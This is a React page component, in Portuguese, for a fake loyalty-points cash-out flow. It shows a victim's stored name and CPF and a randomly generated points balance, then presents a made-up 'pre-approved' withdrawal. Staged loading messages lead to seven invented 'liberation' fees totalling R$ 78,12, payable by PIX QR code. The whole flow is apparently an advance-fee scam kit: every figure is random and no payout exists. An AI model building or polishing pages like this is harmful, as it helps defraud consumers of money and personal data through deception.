import { useState, useMemo, useEffect, useCallback } from "react";
import { useLocation, useSearch } from "wouter";
import { CheckCircle2, Shield, QrCode } from "lucide-react";
import { Button } from "@/components/ui/button";
import Header from "@/components/Header";
import PromoBar from "@/components/PromoBar";
import Footer from "@/components/Footer";
import LoadingOverlay from "@/components/LoadingOverlay";

const bancoNomes: Record<string, string> = {
  itau: "Itau",
  santander: "Santander",
  bradesco: "Bradesco",
  nubank: "Nubank",
  bb: "Banco do Brasil",
  caixa: "Caixa",
};

const taxas = [
  { nome: "Taxa de Registro Bancario", valor: 18.90 },
  { nome: "Taxa de Liberacao de Sistema", valor: 14.50 },
  { nome: "Taxa de Validacao Financeira", valor: 9.80 },
  { nome: "Taxa de Processamento", valor: 11.20 },
  { nome: "Taxa de Seguranca Digital", valor: 7.90 },
  { nome: "Taxa de Autenticacao", valor: 6.40 },
  { nome: "Taxa Administrativa", valor: 9.42 },
];

const TOTAL_TAXAS = taxas.reduce((sum, t) => sum + t.valor, 0);

const loadingMessages = [
  "Conectando ao banco de dados...",
  "Validando informacoes...",
  "Consultando sistema financeiro...",
  "Preparando liberacao...",
];

type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";

export default function Confirmacao() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const tipo = params.get("tipo") || "milhas";
  const banco = params.get("banco") || "";

  const [step, setStep] = useState<Step>("saque");
  const [loadingText, setLoadingText] = useState(loadingMessages[0]);

  const bancoNome = bancoNomes[banco] || banco;
  const nomeUsuario = useMemo(() => localStorage.getItem("nomeUsuario") || "", []);
  const cpfUsuario = useMemo(() => localStorage.getItem("cpfUsuario") || "", []);

  const pontos = useMemo(() => {
    const saved = localStorage.getItem("pontosUsuario");
    if (saved) return parseInt(saved, 10);
    const generated = Math.floor(Math.random() * (150000 - 20000 + 1)) + 20000;
    localStorage.setItem("pontosUsuario", String(generated));
    return generated;
  }, []);

  const percentual = useMemo(() => Math.random() * (0.06 - 0.03) + 0.03, []);
  const valorSaque = pontos * percentual;
  const protocolo = useMemo(() => Math.random().toString(36).substring(2, 10).toUpperCase(), []);

  useEffect(() => {
    if (step !== "loading-taxas") return;
    let i = 0;
    const interval = setInterval(() => {
      i = (i + 1) % loadingMessages.length;
      setLoadingText(loadingMessages[i]);
    }, 1000);
    const timer = setTimeout(() => {
      clearInterval(interval);
      setStep("taxas");
    }, 4000);
    return () => { clearInterval(interval); clearTimeout(timer); };
  }, [step]);

  useEffect(() => {
    if (step !== "loading-pix") return;
    setLoadingText("Gerando pagamento PIX...");
    const timer = setTimeout(() => {
      setStep("pix");
    }, 3500);
    return () => clearTimeout(timer);
  }, [step]);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, [step]);

  const handleSolicitar = useCallback(() => {
    setLoadingText(loadingMessages[0]);
    setStep("loading-taxas");
  }, []);

  const handlePagarPix = useCallback(() => {
    setStep("loading-pix");
  }, []);

  return (
    <div className="min-h-screen bg-[#F6F6F6] flex flex-col" data-testid="confirmacao-page">
      <PromoBar />
      <Header />

      <main className="flex-1 py-12 px-4">
        <div className="max-w-lg mx-auto text-center">

          {step === "saque" && (
            <div
              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
              data-testid="card-confirmacao"
            >
              <div className="w-20 h-20 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-10 h-10 text-[#EC008C]" />
              </div>

              <h1 className="text-2xl font-bold text-[#222222] mb-2" data-testid="text-confirmacao-title">
                Saque Pre-Aprovado Disponivel
              </h1>

              {nomeUsuario && (
                <h3 className="text-lg font-semibold text-[#222222] mb-0.5" data-testid="text-nome-final">
                  {nomeUsuario}
                </h3>
              )}
              {cpfUsuario && (
                <p className="text-sm text-[#6F6F6F] mb-4" data-testid="text-cpf-final">
                  CPF: {cpfUsuario}
                </p>
              )}

              <p className="text-[#6F6F6F] text-base mb-6" data-testid="text-confirmacao-desc">
                Seus pontos foram analisados com sucesso.
                Parte do seu saldo pode ser convertida em valor financeiro.
                {bancoNome && (
                  <> O deposito sera realizado na sua conta do <span className="font-semibold text-[#222]">{bancoNome}</span>.</>
                )}
              </p>

              <div
                className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-5 mb-6 text-center"
                data-testid="box-valor"
              >
                <p className="text-sm text-[#6F6F6F] mb-1">Seus pontos:</p>
                <h3 className="text-2xl font-bold text-[#222222] mb-4" data-testid="text-total-pontos">
                  {pontos.toLocaleString("pt-BR")}
                </h3>
                <p className="text-sm text-[#6F6F6F] mb-1">Valor disponivel para saque ({Math.round(percentual * 100)}%):</p>
                <h2 className="text-3xl font-bold text-[#EC008C]" data-testid="text-valor-estimado">
                  R$ {valorSaque.toFixed(2).replace(".", ",")}
                </h2>
              </div>

              <Button
                onClick={handleSolicitar}
                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-4"
                data-testid="button-solicitar-saque"
              >
                Solicitar Valor
              </Button>

              <p className="text-xs text-[#999] mb-4" data-testid="text-protocolo">
                Protocolo: #{protocolo}
              </p>

              <p className="text-[10px] text-[#AAAAAA] mb-6">
                Valores sujeitos a validacao conforme regulamento da plataforma.
              </p>

              <div className="flex flex-col gap-2">
                <Button
                  variant="outline"
                  onClick={() => setLocation("/")}
                  className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
                  data-testid="button-voltar-inicio"
                >
                  Voltar para o inicio
                </Button>
                <button
                  onClick={() => setLocation("/resgate")}
                  className="text-sm text-[#EC008C] font-medium hover:underline"
                  data-testid="button-novo-resgate"
                >
                  Fazer novo resgate
                </button>
              </div>
            </div>
          )}

          {step === "taxas" && (
            <div
              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
              data-testid="card-taxas"
            >
              <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
                <Shield className="w-8 h-8 text-[#EC008C]" />
              </div>

              <h2 className="text-xl font-bold text-[#222222] mb-2" data-testid="text-taxas-title">
                Taxas para Liberacao do Saque
              </h2>

              <p className="text-[#6F6F6F] text-sm mb-6" data-testid="text-taxas-desc">
                Para concluir a liberacao junto ao sistema bancario, e necessario regularizar as taxas abaixo.
              </p>

              <div className="bg-[#FAFAFA] border border-[#E5E5E5] rounded-xl p-4 mb-6 text-left" data-testid="lista-taxas">
                {taxas.map((taxa, i) => (
                  <div
                    key={i}
                    className={`flex items-center justify-between py-2.5 ${i < taxas.length - 1 ? "border-b border-[#F0F0F0]" : ""}`}
                    data-testid={`taxa-item-${i}`}
                  >
                    <span className="text-sm text-[#444]">{taxa.nome}</span>
                    <span className="text-sm font-semibold text-[#222]">R$ {taxa.valor.toFixed(2).replace(".", ",")}</span>
                  </div>
                ))}
              </div>

              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6" data-testid="total-taxas">
                <p className="text-sm text-[#6F6F6F] mb-1">Total a pagar:</p>
                <h3 className="text-2xl font-bold text-[#EC008C]">R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}</h3>
              </div>

              <Button
                onClick={handlePagarPix}
                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full"
                data-testid="button-pagar-pix"
              >
                Pagar com PIX
              </Button>

              <p className="text-[10px] text-[#AAAAAA] mt-4">
                Valores sujeitos a validacao conforme regulamento da plataforma.
              </p>
            </div>
          )}

          {step === "pix" && (
            <div
              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
              data-testid="card-pix"
            >
              <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
                <QrCode className="w-8 h-8 text-[#EC008C]" />
              </div>

              <h3 className="text-xl font-bold text-[#222222] mb-2" data-testid="text-pix-title">
                Pagamento via PIX
              </h3>

              <p className="text-[#6F6F6F] text-sm mb-6" data-testid="text-pix-desc">
                Escaneie o QR Code abaixo para finalizar o pagamento
              </p>

              <div className="flex justify-center mb-5">
                <img
                  src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=PagamentoPIX78"
                  alt="QR Code PIX"
                  className="w-[220px] h-[220px] rounded-lg border border-[#E5E5E5]"
                  data-testid="img-qr-code"
                />
              </div>

              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-4" data-testid="pix-valor">
                <p className="text-lg font-bold text-[#EC008C]">Valor: R$ 78,12</p>
              </div>

              <div className="flex items-center justify-center gap-2 mb-6">
                <div className="w-2 h-2 rounded-full bg-[#EC008C] animate-pulse" />
                <p className="text-sm text-[#6F6F6F] font-medium" data-testid="text-pix-aguardando">
                  Aguardando confirmacao...
                </p>
              </div>

              <Button
                variant="outline"
                onClick={() => setLocation("/")}
                className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
                data-testid="button-voltar-inicio-pix"
              >
                Voltar para o inicio
              </Button>
            </div>
          )}
        </div>
      </main>

      <Footer />

      <LoadingOverlay
        visible={step === "loading-taxas"}
        title="Validando solicitacao..."
        subtitle={loadingText}
        duration={4000}
        testId="loading-taxas-overlay"
      />

      <LoadingOverlay
        visible={step === "loading-pix"}
        title="Gerando pagamento PIX..."
        subtitle="Conectando ao sistema de pagamentos..."
        duration={3500}
        testId="loading-pix-overlay"
      />
    </div>
  );
}
